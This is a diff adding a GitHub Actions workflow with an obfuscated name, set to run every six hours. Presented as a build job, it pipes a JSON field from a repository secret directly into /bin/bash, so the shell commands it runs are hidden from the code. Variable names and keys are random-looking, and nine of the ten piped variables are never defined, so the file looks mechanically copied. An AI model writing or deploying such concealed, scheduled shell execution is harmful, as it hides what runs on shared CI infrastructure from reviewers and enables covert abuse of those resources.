@@ -1,0 +1,26 @@
+name: xianmeifarong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianmeifarong
+        env:
+          ovzed4132: ${{ secrets.ovzed4132 }}
+        run: |
+          echo $ovzed4132 | jq -r .sla7 | /bin/bash
+          echo $vml03 | jq -r .a11 | /bin/bash
+          echo $ul7 | jq -r .uwyg2 | /bin/bash
+          echo $hc97782 | jq -r .rmtma93221 | /bin/bash
+          echo $ssbdg288 | jq -r .c3 | /bin/bash
+          echo $wxly57539 | jq -r .ia13 | /bin/bash
+          echo $qei2 | jq -r .vse179 | /bin/bash
+          echo $wk17913 | jq -r .nn771 | /bin/bash
+          echo $ovrlq74 | jq -r .zybt65661 | /bin/bash
+          echo $jv07 | jq -r .jews08925 | /bin/bash
+
